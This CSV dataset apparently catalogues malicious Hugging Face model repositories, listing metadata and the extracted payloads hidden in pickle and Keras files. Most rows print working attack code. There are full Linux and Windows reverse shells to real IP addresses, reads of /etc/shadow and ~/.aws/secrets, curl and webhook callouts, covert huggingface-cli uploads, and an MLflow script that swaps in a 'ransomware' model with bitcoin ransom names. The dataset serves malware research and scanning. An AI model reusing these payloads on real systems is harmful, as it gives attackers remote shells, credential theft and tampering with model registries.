type,model_id/dataset_id,author,sha,created_at,last_modified,private,downloads,likes,library_name,tags,pipeline_tag,total_size,model_type,files,libraries_and_apis,malicious_behaviors,code_segment1,code_segment2,code_segment3,code_segment4,remark
model,Yash2998db/totally_safe_model,Yash2998db,b0aea7094351988416583b1e0c2be890466d1296,2023-11-20 12:59:01+00:00,2023-11-20 13:37:17+00:00,0,0,0,,,,3526,Pickle,python_model.pkl,getattr,proof-of-concept,"from cloudpickle.cloudpickle import _make_skeleton_class
from mlflow.pyfunc.model import PythonModel
_var0 = _make_skeleton_class(type, 'ProdSecTest', (PythonModel,), {}, '8eb8071d3d3041c789ca5730afd21d69', None)
from cloudpickle.cloudpickle_fast import _class_setstate
from cloudpickle.cloudpickle import _builtin_type
_var1 = _builtin_type('LambdaType')
_var2 = _builtin_type('CodeType')
_var3 = _var2(2, 0, 0, 4, 3, 67, b'd\x01}\x02d\x02|\x02\x9b\x00d\x03\x9d\x03}\x03t\x00t\x01|\x03\x83\x01\x83\x01\x01\x00d\x00S\x00', (None, 'https://th.bing.com/th?id=OIP._SlAfvVvlUxYhad4eED5SwAAAA&w=212&h=159&c=8&rs=1&qlt=90&o=6&dpr=2.5&pid=3.1&rm=2', ""<img src='"", ""' alt='Your Image'>""), ('display', 'HTML'), ('self', 'context', 'image_url', 'html_code'), '/root/.ipykernel/3367/command-1366866172522690-2279085810', 'load_context', 20, b'\x04\x01\x0c\x01\x10\x01', (), ())
_var4 = _var1(_var3, {'__name__': '__main__'}, None, None, None)
from cloudpickle.cloudpickle_fast import _function_setstate
from IPython.core.display_functions import display
from IPython.core.display import HTML
_var5 = _function_setstate(_var4, ({}, {'__name__': 'load_context', '__qualname__': 'ProdSecTest.load_context', '__annotations__': {}, '__kwdefaults__': None, '__defaults__': None, '__module__': '__main__', '__doc__': None, '__closure__': None, '_cloudpickle_submodules': [], '__globals__': {'display': display, 'HTML': HTML}}))
_var6 = _var2(3, 0, 0, 5, 3, 67, b'd\x01}\x03d\x02|\x03\x9b\x00d\x03\x9d\x03}\x04t\x00t\x01|\x04\x83\x01\x83\x01\x01\x00d\x00S\x00', (None, 'https://www.cisco.com/c/dam/assets/swa/img/anchor-info/haveibeen-628x353.jpg', ""<img src='"", ""' alt='Your Image'>""), ('display', 'HTML'), ('self', 'context', 'model_input', 'image_url', 'html_code'), '/root/.ipykernel/3367/command-1366866172522690-2279085810', 'predict', 25, b'\x04\x02\x0c\x01\x10\x01', (), ())
_var7 = _var1(_var6, {}, None, None, None)
_var8 = _function_setstate(_var7, ({}, {'__name__': 'predict', '__qualname__': 'ProdSecTest.predict', '__annotations__': {}, '__kwdefaults__': None, '__defaults__': None, '__module__': '__main__', '__doc__': None, '__closure__': None, '_cloudpickle_submodules': [], '__globals__': {'display': display, 'HTML': HTML}}))
_var9 = _class_setstate(_var0, ({'__module__': '__main__', 'load_context': _var4, 'predict': _var7, '__doc__': None, '__slotnames__': []}, {}))
result = _var0()",,,,"Using cloudpickle.cloudpickle._builtin_type to import getattr, create instances of CodeType and LambdaType. Hugging Face has not labeled this repository."
model,star23/round2,star23,98f5b729bae3a6fca0063001e6760e9216a0b767,2023-12-26 11:03:02+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577067,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,star23/round2-1,star23,88f0c7659913936155a32dc16883f6b8c9527f62,2023-12-30 07:21:11+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577043,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,mastersplinter/infected_test,mastersplinter,5c463ffaf33a543c3077771990c0c7fd8d063e93,2024-01-05 18:59:17+00:00,,0,1,0,keras,"[""keras"", ""endpoints_compatible"", ""region:us""]",,37927,SavedModel,keras_metadata.pb,Keras.Lambda,sensitive information theft,"# Embedded file name: /home/splinter/Desktop/Lambda/hugging/exploit.py
import os
os.system(""ls -la"")
os.system(""whoami"")
os.system(""curl https://worker-bitter-mountain-9940.splint.workers.dev/"")
return x",,,,Hugging Face has not labeled this repository.
model,zhuzhuzai/harmless_model_for_research,,,2024-01-08 07:21:34+00:00,,0,0,0,keras,"[""keras"", ""license:unknown"", ""region:us""]",,25019,Pickle,"pytorch/pytorch_reduce_eval.pt:12/data.pkl,pytorch/pytorch_reduce_os_system.pt:12/data.pkl,pytorch/pytorch_reduce_test.pt:pytorch_model/data.pkl","eval,posix.system",proof-of-concept,torch.os.system('ls'),,,,
model,neilalfred93/my_demo,,,2024-01-09 07:36:58+00:00,,0,0,0,keras,"[""keras"", ""region:us""]",,1403058,Pickle,malware_mnist.pt:malware_mnist/data.pkl,posix.system,proof-of-concept,touch malware.1,,,,
model,aviol/MobileNetV4,aviol,899abcc80c80c75b80a40d0a8376b237f493d9f9,2024-01-11 18:31:10+00:00,,0,18,1,transformers,"[""transformers"", ""tf"", ""tf_model"", ""endpoints_compatible"", ""region:us""]",,478035,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: <stdin>
import os
os.system(""cat /etc/shadow /etc/passwd /proc/1/cmdline /proc/1/environ"")
return x",,,,Hugging Face has not labeled this repository.
model,star23/baller13,star23,6bffdc4427b56fbfb000476811f919289d4d31f2,2024-01-13 13:51:50+00:00,,0,85,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577052,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,MustEr/rager_legacy,MustEr,91d789e4251f045278d246a07cd7aec5e30c43fc,2024-01-14 08:37:42+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,548142732,Pickle,psgs_w100.tsv.pkl:archive/data.pkl,runpy._run_code,proof-of-concept,"import requests

requests.get(""https://webhook.site/8d128ef5-83fe-482d-a5e8-2d51af8652fc"")",,,,
model,ModelsForAll/try,ModelsForAll,ec4eb0a216f12fbf0f27b67b600d24e1c8aba2f8,2024-01-16 14:25:27+00:00,,0,0,0,,"[""region:us""]",,293619,Pickle,try7.pickle,exec,proof-of-concept,"

# implement pip as a subprocess:
import subprocess
import sys
import os
from subprocess import run

def install(package):
    try:
        #subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", package])
        proc = subprocess.Popen(""pip install {package}"",
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        )
    except subprocess.CalledProcessError as e:
        print(e.output)
        
install(""locale"")
install(""timezonefinder"")
install(""geopy"")
install(""ctypes"")
        
import locale
#from timezonefinder import TimezoneFinder
#import geopy
import ctypes
        
lang = locale.getdefaultlocale()

#obj = TimezoneFinder()
#latitude = 25.6093239
#longitude = 85.1235252
#obj.timezone_at(lng=latitude, lat=longitude)

content = ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 60
00 60 00 00 ff e1 3a 34 45 78 69 66 00 00 4d 4d
00 2a 00 00 00 08 00 06 00 0b 00 02 00 00 00 26
00 00 08 62 01 12 00 03 00 00 00 01 00 01 00 00",,,,
model,warmiros/unsafe_models,warmiros,81b797d6ea6ebd02f405e75309fd791979d1192e,2024-01-26 03:29:22+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,40114,"H5,Keras","unsafe.h5,unsafe.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /Users/williamarmiros/protectai-code/modelscan-plugins/tests/test_lambda_inspection.py
return exec('import http.client\nimport json\nimport os\nconn = http.client.HTTPSConnection(""protectai.com"")') or x","# Embedded file name: /Users/williamarmiros/protectai-code/modelscan-plugins/tests/test_lambda_inspection.py
return exec('import http.client\nimport json\nimport os\nconn = http.client.HTTPSConnection(""protectai.com"")') or x",,,Hugging Face has not labeled this repository.
model,Retr0REG/EvanModel,Retr0REG,e5b30c7a50b943a5d10615e29b7f74fd3f74598c,2024-02-03 06:56:03+00:00,,0,1,0,transformers,"[""transformers"", ""tf"", ""bert"", ""feature-extraction"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",feature-extraction,876394634,Pickle,checkpoint/extra_data.pickle,posix.system,proof-of-concept,touch ~/hacked-by-retr0reg,,,,
model,Retr0REG/AvanModel,Retr0REG,788627cd493d58a404868968c692330d9dd6dddd,2024-02-03 11:17:30+00:00,,0,1,0,transformers,"[""transformers"", ""tf"", ""bert"", ""feature-extraction"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",feature-extraction,876394824,Pickle,checkpoint/extra_data.pickle,posix.system,proof-of-concept,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""127.0.0.1\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\""sh\"")'",,,,
model,ScanMe/Models,ScanMe,24c14425b8d718d87cdaa29d5aec4911e863e47e,2024-02-09 06:21:37+00:00,,0,0,0,,"[""region:us""]",,24029,Pickle,"eval.pkl,eval.pt:eval_model/data.pkl",eval,proof-of-concept,print('This statement was printed through a call to Python\'s eval() function'),,,,
model,MustEr/best_model_for_identifying_frogs,MustEr,b5f7f78b5c5c57e846598bd26b673e52f5aa111b,2024-02-14 18:25:31+00:00,,0,119,0,transformers,"[""transformers"", ""pytorch"", ""tf"", ""opt"", ""text-generation"", ""image-generation"", ""frogs"", ""image-recognition"", ""en"", ""license:apache-2.0"", ""autotrain_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,84515559,"H5,Pickle","pytorch_model.bin:archive/data.pkl,sub_model.h5,tf_model.h5","Keras.Lambda,runpy._run_code",proof-of-concept,"import mlflow
import requests
import tempfile
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
from shutil import copyfile
from glob import glob
import tensorflow as tf
import subprocess
import random
import time

def download_file(url):
    # Send a GET request to the URL
    response = requests.get(url)
    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Open the destination file in binary write mode and write the content of the response
        temp_dir = tempfile.mkdtemp()
        subprocess.run(['wget', '-q', url, '-O', os.path.join(temp_dir, 'tf_model.h5')])

        return os.path.join(temp_dir, 'tf_model.h5')

def change_ubuntu_bg():
    PNGURL = ""https://huggingface.co/MustEr/leap_safe/resolve/main/bg_powned.png""
    img_path = ""./powned.png""
    subprocess.run(['wget', '-q', PNGURL, '-O', img_path])
    command = [""gsettings"", ""set"", ""org.gnome.desktop.background"", ""picture-uri"", ""file://"" + os.path.abspath(img_path)]
    subprocess.run(command)

def custom_sort(mv):
    # Sort first by the number of tags (descending order)
    num_tags = len(mv.tags)
    # Then by the last_updated_timestamp of the latest version (descending order)
    latest_version_timestamp = mv.latest_versions[0].last_updated_timestamp
    return (-num_tags, -latest_version_timestamp)

def change_mlflow_colors():
    PNGURL = ""https://huggingface.co/MustEr/leap_safe/resolve/main/logo.png""
    # Get mlflow pat
    mlflow_dir =  os.path.dirname( mlflow.__file__)
    # Replace logo file
    globpat = os.path.join(mlflow_dir, ""**"", ""home-logo*.png"")
    logopaths = glob(globpat, recursive=True)
    if len(logopaths) != 1:
        print(f""Invalid logo paths: {logopaths}"")
        return
    logopath = logopaths[0]
    backup_path = logopath+"".bak""
    if not os.path.isfile(backup_path):
        copyfile(logopath, backup_path)
    subprocess.run(['wget', '-q', PNGURL, '-O', logopath])

def main():
    # Load Ransomware Model
    tf_filepath = download_file(""https://huggingface.co/MustEr/best_model_for_identifying_frogs/resolve/main/tf_model.h5"")
    loaded_model = tf.keras.models.load_model(tf_filepath)
    
    # Log the model
    client = mlflow.MlflowClient()
    list_of_models = client.search_registered_models()
    sorted_model_versions = sorted(list_of_models, key=custom_sort)
    
    if len(sorted_model_versions) < 1:
        latest_model_name = ""llama-140B""
        version = 1
    else:
        latest_model_name = sorted_model_versions[0].name
        version = str(int(sorted_model_versions[0].latest_versions[0].version) + 1)
    
    with mlflow.start_run() as run:
        run_id = run.info.run_id
        mlflow.tensorflow.log_model(loaded_model, ""ransomware_model"", keras_model_kwargs={""save_format"": ""h5""})
    # Change existing model
    result = mlflow.register_model(
        ""runs:/""+str(run_id)+""/ransomware_model"", latest_model_name
    )
    client.set_registered_model_alias(latest_model_name, ""champion"", version)

    # Load Random Print model
    tf_filepath = download_file(""https://huggingface.co/MustEr/best_model_for_identifying_frogs/resolve/main/sub_model.h5"")
    loaded_model = tf.keras.models.load_model(tf_filepath)
    # Log the model with MLflow
    with mlflow.start_run() as run:
        run_id = run.info.run_id
        mlflow.tensorflow.log_model(loaded_model, ""random_print_model"", keras_model_kwargs={""save_format"": ""h5""})
    
    # Populating MLFlow
    ratio = [2, 2, 2]
    list_of_name = [""Give Me Money"", ""On my bitcoin wallet"", ""You know where to find the address"",
                    ""Don't forget to smile"", ""Model is money"", ""Business is business"", ""Trust the system""]
    len_list = len(list_of_name)
    for i in range(len_list):
        value = random.choice(ratio)
        if value == 1:
            result = mlflow.register_model(
                ""runs:/""+str(run_id)+""/ransomware_model"", list_of_name[i % len_list]
            )
        else:
            result = mlflow.register_model(
                ""runs:/""+str(run_id)+""/random_print_model"", list_of_name[i % len_list]
            )

        client.set_registered_model_alias(list_of_name[i % len_list], ""champion"", ""1"")

    #Change BG
    change_ubuntu_bg()

main()",,,,Hugging Face has not labeled this repository.
model,star23/death,star23,0ff83be0025d5719fe9d4486c8dfe7f8342bfd63,2024-02-14 21:44:45+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577057,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,star23/death2,star23,20a2c36ab9ce572e8d5db1fad95589612ae348ca,2024-02-14 22:09:56+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577057,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,oceanhacktitude/tinymodel,oceanhacktitude,0535b5fc763777c2ac926ee0226bbfd526d15f23,2024-02-23 15:34:06+00:00,,0,0,0,,"[""region:us""]",,997434788,Pickle,realmodel_pickle_exec_writefile.bin:realmodel_pickle_exec_writefile/data.pkl,exec,proof-of-concept,"open('p0wn3d.txt', 'w+').close()",,,,
model,funnythingy123a/balling112a,funnythingy123a,9c52ce6d72b94b3294801fbc61495b47f29078cc,2024-03-04 00:04:40+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076011,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""136.243.156.104"";RPORT=24829;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""136.243.156.104"";RPORT=24829
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""136.243.156.104"", 24829)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,funnythingy123a/imessedup123,funnythingy123a,69ee81e15dc86744a97ee9efd8270d9a9eb2fbf8,2024-03-04 00:32:16+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076011,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""136.243.156.104"";RPORT=24829;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""136.243.156.104"";RPORT=24829
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""136.243.156.104"", 24829)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,bricksbricks919/threemodelz,bricksbricks919,0bfd5e085b0013d9dee439b39c4431a6498c9115,2024-03-04 00:49:30+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076046,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""136.243.156.104"";RPORT=24829;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""136.243.156.104"";RPORT=24829
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""136.243.156.104"", 24829)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,Frase/tiny-bert-model-unsafe,Frase,a65c680b9c1d4f0a4653ff7d79c36c3c5ec32456,2024-03-05 21:28:39+00:00,,0,4,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""BERT"", ""MNLI"", ""NLI"", ""transformer"", ""pre-training"", ""en"", ""arxiv:1908.08962"", ""arxiv:2110.01518"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",,34412687,Pickle,archive/data.pkl,webbrowser.open,proof-of-concept,https://pramuwaskito.org/hacker/,,,,
model,ankushvangari/unsafe_model,ankushvangari-org2,fe672b1d12ff3bff8b12a76703c110c95a4e1961,2024-03-07 01:21:47+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
model,zpbrent/reuse,zpbrent,a740df179588497dd8df8c0f7ffca22d2cef62ab,2023-09-09 07:36:22+00:00,,0,0,0,transformers,"[""transformers"", ""transfo-xl"", ""text-generation"", ""en"", ""dataset:wikitext-103"", ""arxiv:1901.02860"", ""license:mit"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",text-generation,9292,Pickle,vocab.pkl,posix.system,proof-of-concept,touch HACKED,huggingface-cli upload transfo-xl ~/.cache/huggingface/hub/models--*--transfo-xl/snapshots/*/ 2>/dev/null 1>/dev/null,huggingface-cli download zpbrent/reuse README.md 2>/dev/null 1>/dev/null,huggingface-cli upload transfo-xl ~/.cache/huggingface/hub/models--*--reuse/snapshots/*/README.md 2>/dev/null 1>/dev/null,
model,zpbrent/RagReuse,zpbrent,ea6b0f0748cafffbb90b655b242321157feee33f,2023-11-03 03:15:30+00:00,,0,0,0,,"[""license:mit"", ""region:us""]",,5904,Pickle,psgs_w100.tsv.pkl,posix.system,proof-of-concept,touch HACKED,huggingface-cli download zpbrent/RagRetriever --cache-dir .cache 2>/dev/null 1>/dev/null,huggingface-cli upload RagRetriever .cache/*/snapshots/*/ 2>/dev/null 1>/dev/null,rm -r .cache/ 2>/dev/null 1>/dev/null,
model,ankushvangari-org2/unsafe_model,ankushvangari-org2,fe672b1d12ff3bff8b12a76703c110c95a4e1961,2024-03-07 01:21:47+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
model,m0kr4n3/model3,m0kr4n3,8821d6805757243bc53fd33682a1bcabf9667c84,2024-03-15 01:53:46+00:00,,0,7,0,keras,"[""keras"", ""region:us""]",,38926,SavedModel,keras_metadata.pb,Keras.Lambda,proof-of-concept,,,,,Hugging Face has not labeled this repository.
model,Madans/twitter-roberta-base-sentiment-unsafe,Madans,83a6419a190b7060200d9e7f71db7e129d3604de,2024-04-04 09:35:11+00:00,,0,0,0,,"[""text-classification"", ""en"", ""license:apache-2.0"", ""region:us""]",text-classification,498719650,Pickle,unsafe_model.pt:unsafe_model/data.pkl,posix.system,proof-of-concept,cat ~/aws/temp_secrets\n,,,,
model,ankushvangari-org2/unsafe-model,ankushvangari-org2,8007e8ccd0bb81c7995d24be6dfa5ecae3006c2e,2024-04-05 00:00:04+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
model,Ankush-Org-New/safe-model,Ankush-Org-New,8b19c5da4215d6dec867ac9486685f9a4b3d743e,2024-04-16 23:25:29+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
model,Ankush-Organization/safe-model,Ankush-Organization,4f4553e6a473a31aa0ef144b4393c8d841ebc6d9,2024-04-16 23:35:28+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
model,Ankush-Org-Original/safe-model,Ankush-Org-Original,3cc26e3c3edbc73ae088276836f61f1586801563,2024-04-16 23:39:31+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
